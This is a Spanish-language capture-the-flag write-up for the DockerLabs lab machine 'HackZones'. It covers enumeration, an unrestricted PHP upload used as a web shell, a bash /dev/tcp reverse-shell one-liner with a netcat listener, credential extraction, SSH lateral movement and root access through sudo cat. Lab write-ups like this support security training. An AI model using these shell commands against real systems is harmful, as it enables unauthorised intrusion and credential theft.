<!--
machine: HackZones
platform: DockerLabs
author: d1se0
difficulty: Medium
os: Linux
ip: 172.17.0.2

skills:
- DNS Manipulation
- Insecure Direct Object Reference (IDOR)
- Insecure File Upload
- Remote Code Execution (RCE)
- Local Script Analysis
- Credential Extraction
- SSH Lateral Movement
- Sudo Misconfiguration
- Sensitive File Enumeration
-->

# HackZones - DockerLabs
**Información General**
|  |  |
|---|---|
| **Máquina** | [HackZones](https://mega.nz/file/CdFVBKgb#fYIZ1IRaYjzVjrjmGOzODDquAul8U-wiFpy8Bu2vBA4) |
| **Plataforma** | [Dockerlabs](https://dockerlabs.es/) |
| **Autor** | d1se0 |
| **Dificultad** | `Medio` |
| **Sistema Operativo** | `Linux` |
| **IP** | `172.17.0.2` |
|  |  |

**Skills**:
- DNS Manipulation
- Insecure Direct Object Reference (IDOR)
- Insecure File Upload -> Remote Code Execution (RCE)
- Local Script Analysis -> Credential Extraction
- SSH Lateral Movement
- Sudo Misconfiguration
- Sensitive File Enumeration

**Etapas:**
- [Reconocimiento](#reconocimiento)
- [Enumeración Web](#enumeracion-web)
- [Explotación](#explotacion)
- [Obtención de Reverse Shell](#obtencion-de-reverse-shell)
- [Escalada de Privilegios](#escalada-de-privilegios)
- [Movimiento Lateral](#movimiento-lateral)
- [Abuso de Sudo](#abuso-de-sudo)
- [Acceso Root](#acceso-root)

## Reconocimiento

Comenzamos realizando un escaneo completo de puertos con `nmap`:

![image](imgs/hz-img1.png)

El escaneo revela los siguientes puertos abiertos:
- 22/tcp -> SSH
- 53/tcp -> DNS
- 80/tcp -> HTTP

Ahora efectuamos un segundo escaneo con `nmap` para identificar versiones de los servicios activos.

![image](imgs/hz-img2.png)

Durante el análisis del servicio web, al acceder directamente mediante la IP no se observa contenido relevante. Sin embargo, el título de la página indica un posible dominio:

![image](imgs/hz-img3.png)

Esto sugiere que la aplicación depende de resolución DNS basada en nombre de dominio.

Se agrega la entrada correspondiente en `/etc/hosts`:

![image](imgs/hz-img4.png)

![image](imgs/hz-img5.png)

![image](imgs/hz-img6.png)

Tras esto, el contenido web cambia completamente, revelando un panel de autenticación.

## Enumeracion Web

Se realiza fuzzing de directorios utilizando `gobuster` y se logran identificar recursos relevantes:
- `/dashboard.html`
- `/uploads/`

Esto indica posibles superficies de ataque relacionadas con archivos.

![image](imgs/hz-img7.png)

## Explotacion

Al inspeccionar dashboard.html, se detecta una funcionalidad que permite subir una imagen de perfil.

![image](imgs/hz-img8.png)

![image](imgs/hz-img9.png)

No se observan controles aparentes de validación del tipo de archivo, lo que sugiere una posible vulnerabilidad de subida insegura de archivos.

Se crea un archivo PHP con capacidad de ejecutar comandos:

![image](imgs/hz-img10.png)

![image](imgs/hz-img11.png)

Bueno, parece que no hubo problemas.

![image](imgs/hz-img12.png)

El archivo es subido exitosamente al servidor sin restricciones.

Al acceder al recurso desde:
```bash
http://hackzones.hl/uploads/shell.php?cmd=whoami
```
Se obtiene ejecución remota de comandos, confirmando una vulnerabilidad de Remote Code Execution (RCE).

![image](imgs/hz-img13.png)

## Obtencion de Reverse Shell

Se establece un listener en la máquina atacante:
```bash
nc -lvnp 443
```

Posteriormente, se ejecuta un comando con ayuda del parametro `cmd` de nuestro archivo para obtener una reverse shell:
```bash
bash -c "bash -i >& /dev/tcp/172.17.0.2/443 0>&1"
```

> Este comando puede URLencodearse para evitar errores en su ejecución.

![image](imgs/hz-img14.png)

![image](imgs/hz-img15.png)

Se obtiene acceso interactivo al sistema como usuario del servicio web.

## Escalada de Privilegios

Durante la enumeración local, se identifica un archivo interesante en:
```bash
/var/www/html/secret.sh
```
![image](imgs/hz-img16.png)

![image](imgs/hz-img17.png)

![image](imgs/hz-img18.png)

![image](imgs/hz-img19.png)

![image](imgs/hz-img20.png)

Al revisar el contenido del script desde nuestra maquina atacante, se observa que realiza una operación de decodificación.

Al jecutar el script, se obtiene una credencial en texto plano.

![image](imgs/hz-img21.png)

## Movimiento Lateral

Se revisa el archivo `/etc/passwd` para identificar usuarios válidos del sistema.

![image](imgs/hz-img22.png)

Se detecta el usuario:
```bash
mrrobot
```

Se intenta autenticación vía SSH utilizando la credencial obtenida:
```bash
ssh mrrobot@172.17.0.2
```

![image](imgs/hz-img23.png)

La autenticación es exitosa.

## Abuso de Sudo

Procedemos a revisar a los permisos para el usuario `mrrobot`

![image](imgs/hz-img26.png)

Se identifica que el usuario puede ejecutar el comando cat como cualquier usuario sin necesidad de contraseña.

Esto representa una mala configuración crítica.

Se inspecciona el directorio `/opt` y se encuentra el archivo:
```bash
SystemUpdate
```
![image](imgs/hz-img27.png)

Al visualizar su contenido utilizando sudo:
```bash
sudo cat /opt/SystemUpdate
```
![image](imgs/hz-img28.png)

![image](imgs/hz-img29.png)

Se descubren credenciales pertenecientes al usuario `root`.

## Acceso Root

Se utiliza la credencial descubierta para cambiar al usuario root:

![image](imgs/hz-img30.png)

Bueno, qué les digo.
